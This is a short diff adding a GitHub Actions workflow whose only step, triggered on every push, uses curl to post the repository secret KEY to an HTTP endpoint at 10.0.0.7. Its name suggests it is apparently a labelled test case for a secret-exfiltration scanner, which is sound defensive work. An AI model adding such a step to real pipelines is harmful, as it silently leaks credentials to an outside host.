@@ -1,0 +1,7 @@
+name: clean_ip_glob_trusted_ip
+on: push
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -d "k=${{ secrets.KEY }}" http://10.0.0.7/x
